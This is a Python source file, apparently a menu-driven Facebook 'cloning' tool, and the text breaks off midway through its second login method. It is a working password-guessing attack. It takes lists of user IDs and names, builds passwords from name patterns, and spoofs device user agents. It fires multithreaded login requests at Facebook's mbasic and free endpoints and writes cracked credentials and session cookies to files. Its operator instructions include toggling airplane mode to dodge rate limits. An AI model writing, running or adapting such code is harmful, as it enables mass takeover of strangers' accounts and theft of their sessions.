######HYEU######
from os import path
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
import os,base64,zlib,pip,urllib
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
except:pass
fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
xxxxx=(f"SAMSUNG-SM-G360AZ", "SAMSUNG-SGH-I577", "SAMSUNG-SGH-I437", "SAMSUNG-SGH-I437P", "SAMSUNG-SGH-I437Z", "SAMSUNG-SM-G530A", "SAMSUNG-SM-G530AZ", "SAMSUNG-SM-J120AZ", "SAMSUNG-SM-J120A", "SAMSUNG-SM-J326AZ", "SAMSUNG-SM-J327AZ", "SAMSUNG-SM-J327A", "SAMSUNG-SM-J320AZ", "SAMSUNG-SM-J321AZ", "SAMSUNG-SM-J727AZ", "SAMSUNG-SM-J727A", "SAMSUNG-SGH-I527", "SAMSUNG-SM-G750A", "SAMSUNG-SGH-I717", "SAMSUNG-SGH-I467", "SAMSUNG-SM-N915A", "SAMSUNG-SGH-I317", "SAMSUNG-SM-N910A", "SAMSUNG-SM-N920A", "SAMSUNG-SM-N930A", "SAMSUNG-SGH-I747Z", "SAMSUNG-SGH-I337Z", "SAMSUNG-SGH-I337", "SAMSUNG-SGH-I537", "SAMSUNG-SGH-I257", "SAMSUNG-SM-C105A", "SAMSUNG-SM-G900AZ", "SAMSUNG-SM-G870A", "SAMSUNG-SM-G800A", "SAMSUNG-SM-G920AZ", "SAMSUNG-SM-G920A", "SAMSUNG-SM-G890A", "SAMSUNG-SM-G925A", "SAMSUNG-SM-G928A", "SAMSUNG-SM-G930AZ", "SAMSUNG-SM-G930A", "SAMSUNG-SM-G891A", "SAMSUNG-SM-G935A", "SAMSUNG-SGH-I957", "SAMSUNG-SGH-I957D", "SAMSUNG-SGH-I957M", "SAMSUNG-SGH-I957R", "SAMSUNG-SM-T377A", "SAMSUNG-SM-T817A", "SAMSUNG-SM-T818A", "SAMSUNG-SGH-I497", "SAMSUNG-SM-T217A", "SAMSUNG-SM-T537A", "SAMSUNG-SM-T337A", "SAMSUNG-SM-T807A", "SAMSUNG-SM-T707A")
tan=('https')
iya=('github')
ani=('Fariya')
love=('mbasic')
######bgraph-ua#######
def bm4_ua():
    android_versions = list(range(4, 13))
    samsung_models = ['Galaxy S6', 'Galaxy S7', 'Galaxy S8', 'Galaxy S9', 'Galaxy S10', 'Galaxy Note 5', 'Galaxy Note 8', 'Galaxy Note 9', 'Galaxy A5', 'Galaxy A7', 'Galaxy J5', 'Galaxy J7']
    huawei_models = ['P10', 'P20', 'P30', 'Mate 10', 'Mate 20', 'Y7', 'Y9', 'Nova 3i']
    xiaomi_models = ['Redmi Note 5', 'Redmi Note 6', 'Redmi Note 7', 'Redmi Note 8', 'Redmi Note 9', 'Mi A1', 'Mi A2', 'Mi 8', 'Mi 9', 'Poco F1']
    oppo_models = ['F7', 'F9', 'A3s', 'A5s', 'A7', 'A9', 'R11', 'R17', 'Reno 2', 'Reno 3']
    vivo_models = ['Y55', 'Y71', 'Y81', 'Y91', 'Y93', 'Y95', 'V9', 'V11', 'V15', 'S1']
    realme_models = ['C1', 'C2', '3 Pro', '5 Pro', 'X', 'X2']
    android_models = {
        'samsung': samsung_models,
        'huawei': huawei_models,
        'xiaomi': xiaomi_models,
        'oppo': oppo_models,
        'vivo': vivo_models,
        'realme': realme_models,
    }
    and_vers = random.choice(android_versions)
    brand = random.choice(list(android_models.keys()))
    and_mod = random.choice(android_models[brand])
    and_id = f'{random.randint(9,99)}.0.0.{random.randint(9,99)}{random.randint(9,99)}'
    app_uld = f'{random.randint(111111, 999999)}.{random.randint(111,999)}'
    app_ver = f'{random.randint(99,999)}.{random.randint(99,999)}.{random.randint(99,999)}.{random.randint(99,999)}'
    app_vercode = str(random.randint(100000000,999999999))
    pkg_name = random.choice(('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana'))
    ua = f'Dalvik/2.1.0 (Linux; U; Android {and_vers}; {brand} {and_mod} Build/SKQ1.{app_uld}) [FBAN/EMA;FBLC/en_US;FBAV/{app_ver};FBBV/{app_vercode};FBDV/{and_mod};FBMD/{brand};FBSN/{and_id};FBPN/{pkg_name}]'
    return ua
######mbasic-ua#######
mbasic = random.choice(['Mozilla/5.0 (Linux; U; Android 10; V1716A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4495.71 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 13; yo-NG; SM-N920) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4670.138 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 10; SM-A1020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4231.71 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 13; mn-MN; XT2127-45) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4682.128 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 11; GT-81) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4742.141 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 6; af-ZA; RMX3312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4644.78 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 12; XT2127-83) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.4566.45 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 10; bg-BG; GT-S7278U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4225.143 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 12; RMX309C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4808.62 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 8; et-EE; GT-7050) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4524.101 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 6; GT-N5120) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4371.136 Mobile Safari/537.36',               
'Mozilla/5.0 (Linux; U; Android 9; ka-GE; RMX31ZG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4574.129 Mobile Safari/537.36',         
'Mozilla/5.0 (Linux; U; Android 7; Xperia XA36) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.4525.118 Mobile Safari/537.36',           
'Mozilla/5.0 (Linux; U; Android 11; be-BY; GT-S7500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.4207.132 Mobile Safari/537.36',        
'Mozilla/5.0 (Linux; U; Android 11; XT2127-146) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4533.85 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; U; Android 10; hi-IN; V1713) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4210.57 Mobile Safari/537.36',    
'Mozilla/5.0 (Linux; U; Android 9; ZenFone Max (M2)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4375.82 Mobile Safari/537.36',        
'Mozilla/5.0 (Linux; U; Android 7; eu-ES; CPH1937) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.4658.76 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 13; GT-S5230W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4553.127 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 13; hi-IN; CPH2295) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4667.75 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 11; RMX3341) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4702.129 Mobile Safari/537.36',                                                                                       
'Mozilla/5.0 (Linux; U; Android 12; ps-AF; CPH1813) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4520.103 Mobile Safari/537.36',                                                                               
'Mozilla/5.0 (Linux; U; Android 11; RMX3141) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4820.138 Mobile Safari/537.36',                                                                                         
'Mozilla/5.0 (Linux; U; Android 9; zh-CN; RMX3221) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4318.65 Mobile Safari/537.3',                                                                                    
'Mozilla/5.0 (Linux; U; Android 7; GT-N7100T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4646.96 Mobile Safari/537.36',               
'Mozilla/5.0 (Linux; U; Android 12; bn-BD; GT-N7005) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.4602.110 Mobile Safari/537.36',      
'Mozilla/5.0 (Linux; U; Android 7; V1540) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.4827.107 Mobile Safari/537.36',                  
'Mozilla/5.0 (Linux; U; Android 11; bn-BD; RMX3365) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4555.137 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 7; RMX3373) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.4485.116 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 10; yi-001; GT-7020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4335.108 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 10; CPH2019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4659.84 Mobile Safari/537.36',                                                                                         
'Mozilla/5.0 (Linux; U; Android 8; bg-BG; RMX3340) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.4356.56 Mobile Safari/537.36',                                                                                 
'Mozilla/5.0 (Linux; U; Android 8; CPH2191) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4775.131 Mobile Safari/537.36',                                                                                      
'Mozilla/5.0 (Linux; U; Android 10; pt-BR; CPH2289) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4576.92 Mobile Safari/537.36',                                                                                  
'Mozilla/5.0 (Linux; U; Android 10; GT-S5280) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.4883.105 Mobile Safari/537.36',              
'Mozilla/5.0 (Linux; U; Android 7; ta-IN; GT-I9250) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4634.64 Mobile Safari/537.36',          
'Mozilla/5.0 (Linux; U; Android 12; GT-S6010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4738.40 Mobile Safari/537.36',               
'Mozilla/5.0 (Linux; U; Android 11; hi-IN; GT-C3322i) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4700.55 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 11; GT-I5508) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4474.86 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 9; en-US; Meizu 16Xs) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4629.40 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 10; GT-19152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.4240.135 Mobile Safari/537.36',                                                                                       
'Mozilla/5.0 (Linux; U; Android 12; bs-BA; XT2127-137) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4292.77 Mobile Safari/537.36',                                                                                
'Mozilla/5.0 (Linux; U; Android 10; GT-S6102) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4593.54 Mobile Safari/537.36',                                                                                        
'Mozilla/5.0 (Linux; U; Android 11; yo-NG; GT-S5310N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.4716.111 Mobile Safari/537.36',                                                                                
'Mozilla/5.0 (Linux; U; Android 9; GT-S758X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4580.72 Mobile Safari/537.36',              
'Mozilla/5.0 (Linux; U; Android 10; nl-NL; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.4771.116 Mobile Safari/537.36',       
'Mozilla/5.0 (Linux; U; Android 11; RMX3361) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4266.109 Mobile Safari/537.36',               
'Mozilla/5.0 (Linux; U; Android 6; xh-ZA; XT2127-7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4738.93 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 8; Xperia 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4478.42 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 6; be-BY; GT-S8500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4605.108 Mobile Safari/537.36'])
#####_______TIME MODS________#####
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
def clear():
        os.system('clear')
        print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"     
#####_______LOGO______#####
logo=("""\33[1;32m




                    ██████╗ ███╗   ███╗ █████╗ \n                    ██╔══██╗████╗ ████║██╔══██╗\n                    ██████╔╝██╔████╔██║███████║\n                    ██╔══██╗██║╚██╔╝██║██╔══██║\n                    ██████╔╝██║ ╚═╝ ██║██║  ██║\n                    ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝\n                 H   Y   E   U   •   S   O   U   U\n══════════════════════════════════════════════════════════════════════ """)
def linex():
        print(70*'\033[1;32m═')
def line():
        print(70*'\033[1;91m═')
def clear():
        os.system(f'clear')
        print(logo)  
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]

def BM4():
	clear()
	#ckx()
	print(f"\33[1;32m 1. FILE CLONING")
	print(f"\33[1;32m 2. FILE MAKE")
	print(f"\33[1;32m 0. EXIT")
	linex()
	me=input(f'\033[1;32m  CHOOSE : ')
	if me in ["1", "01","11","A","a"]:
		clear()
		print(f'\33[1;32m FILE EXAMPLE : /sdcard/BMA.txt')
		linex()
		file = input(f'\033[1;32m PUT FILE PATH\033[1;32m : ')
		try:
			fo = open(file,'r').read().splitlines()
		except FileNotFoundError:
			print(f' File location not found ')
			BMA()
		clear()
		print(f'\033[1;32m 1. METHOD 1 (MBASIC)')
		print(f'\033[1;32m 2. METHOD 2 (B-GRAPH)')
		linex()
		mthd=input(f'\033[1;32m CHOOSE : ')
		plist=[]
		try:
			clear()
			ps_limit = int(input(f' \033[1;32m HOW MANY PASSWORD DO YOU WANT TO ADD ? '))
		except:
			ps_limit =1
		clear()
		print(f'\x1b[1;32m     EXAMPLE : \033[1;32mfirst123 — first143 — first12345 — last12345')
		print(f'\x1b[1;32m     EXAMPLE : \033[1;32mfirstlast — first last — lastfirst — firstfirst')
		linex()
		for i in range(ps_limit):
			plist.append(input(f' \033[1;32m  PUT PASSWORD {i+1}: '))
		clear()
		print(f' \033[1;32m  DO YOU WANT TO SHOW CP IDS? (Y/N)')
		linex()
		cx=input(f'\033[1;32m  CHOOSE : ')
		if cx in ['n','N','no','NO','2']:
			pcp.append(f'n')
		else:
			pcp.append(f'y')
		with tred(max_workers=30) as d:
			clear()
			total_ids = str(len(fo))
			print(f'\x1b[1;32m  ALIVE ACCOUNTS SAVE IN BMA{mthd}-OKS.txt')
			print(f"\x1b[1;32m  CLONING TIME STARTED \033[1;36m"+str(a)+"\033[1;37m:\033[1;36m"+str(lt()[4])+" "+ tag+"\x1b[1;36m")
			linex()
			print(f'\x1b[1;32m  TN : \033[1;36mON/OFF AIRPLANE MODE EVERY 90 SECS :))')
			linex()
			for user in fo:
				ids,names = user.split(f'|')
				passlist = plist
				if mthd in ['1','01']:
					d.submit(mthd1,ids,names,passlist,total_ids)
				elif mthd in ['2','02']:
					d.submit(mthd2,ids,names,passlist,total_ids)
				#elif mthd in ['3','03']:
					#crack_submit.submit(ffb1,ids,names,passlist)
		print('\33[1;32m')
		linex()
		print(f'\33[1;32m  TOTAL ALIVE ACCOUNTS : '+str(len(oks)))
		print(f'\33[1;91m  TOTAL CP ACCOUNTS : '+str(len(cps)))
		print(f'\33[1;32m  THE PROCESS HAS COMPLETED ')
		linex()
		input(f'\33[1;32m  ENTER TO BACK MENU')
		BMA()
	elif me in ['2','02','b','B']:
		clear()
		os.system('cd')
		os.system('cd KHAN')
		os.system('python DUMP.py')
	elif me in ['2','02','b','B']:
		print(' \33[1;32mTHANK YOU FOR USING BMA TOOL BY LEVV FUCCN')
		exit()

#####_______METHOD-1_______#####					
def mthd1(ids,names,passlist,total_ids):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;36m BM4-M1 PROCESSING \033[1;37m%s/%s  \033[1;32m%s\033[1;37m/\033[1;91m%s\033[1;37m'%(loop,total_ids,len(oks),len(cps)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'Ahmed'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua = str(mbasic)
                        head = {
    'host': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '2.549999952316284',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"RMX3241"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
    'viewport-width': '980',
}
                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        Khushal=session.cookies.get_dict().keys()
                        if "c_user" in Khushal:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m BMA OKS | '+ids+' | '+pas+'\033[1;32m')
                                open(f'/sdcard/BMA1-OKS.txt', 'a').write(ids+'|'+pas+'|'+kuki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Khushal:
                                if 'y' in pcp:
                                        print('\r\r\033[1;91m BMA CPS | '+ids+' | '+pas+'\033[1;91m')
                                        open(f'/sdcard/BMA1-CPS.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
xxxxx=(f"SAMSUNG-SM-G360AZ", "SAMSUNG-SGH-I577", "SAMSUNG-SGH-I437", "SAMSUNG-SGH-I437P", "SAMSUNG-SGH-I437Z", "SAMSUNG-SM-G530A", "SAMSUNG-SM-G530AZ", "SAMSUNG-SM-J120AZ", "SAMSUNG-SM-J120A", "SAMSUNG-SM-J326AZ", "SAMSUNG-SM-J327AZ", "SAMSUNG-SM-J327A", "SAMSUNG-SM-J320AZ", "SAMSUNG-SM-J321AZ", "SAMSUNG-SM-J727AZ", "SAMSUNG-SM-J727A", "SAMSUNG-SGH-I527", "SAMSUNG-SM-G750A", "SAMSUNG-SGH-I717", "SAMSUNG-SGH-I467", "SAMSUNG-SM-N915A", "SAMSUNG-SGH-I317", "SAMSUNG-SM-N910A", "SAMSUNG-SM-N920A", "SAMSUNG-SM-N930A", "SAMSUNG-SGH-I747Z", "SAMSUNG-SGH-I337Z", "SAMSUNG-SGH-I337", "SAMSUNG-SGH-I537", "SAMSUNG-SGH-I257", "SAMSUNG-SM-C105A", "SAMSUNG-SM-G900AZ", "SAMSUNG-SM-G870A", "SAMSUNG-SM-G800A", "SAMSUNG-SM-G920AZ", "SAMSUNG-SM-G920A", "SAMSUNG-SM-G890A", "SAMSUNG-SM-G925A", "SAMSUNG-SM-G928A", "SAMSUNG-SM-G930AZ", "SAMSUNG-SM-G930A", "SAMSUNG-SM-G891A", "SAMSUNG-SM-G935A", "SAMSUNG-SGH-I957", "SAMSUNG-SGH-I957D", "SAMSUNG-SGH-I957M", "SAMSUNG-SGH-I957R", "SAMSUNG-SM-T377A", "SAMSUNG-SM-T817A", "SAMSUNG-SM-T818A", "SAMSUNG-SGH-I497", "SAMSUNG-SM-T217A", "SAMSUNG-SM-T537A", "SAMSUNG-SM-T337A", "SAMSUNG-SM-T807A", "SAMSUNG-SM-T707A")
def mthd2(ids,names,passlist,total_ids):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;36m BM4-M2 PROCESSING \033[1;37m%s/%s  \033[1;32m%s\033[1;37m/\033[1;91m%s\033[1;37m'%(loop,total_ids,len(oks),len(cps)));sys.stdout.flush()
                        fn = names.split(f' ')[0]
                        try:
                                ln = names.split(f' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace(f'first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                #ua_string = f'Davik/2.1.0 (linex; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/es_CU;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                #ua_string = f'Davik/2.1.0 (linex; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.4,width=1080,height=1403};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Libtelco;FBMF/Samsung;FBBD/Samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/10;FBOP/1;FBCA/arm64-v8a:]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'source':'login','format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "locale":"en_US","client_country_code":"US",
                                        'device':gtt,
                                        'device_id':adid,
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
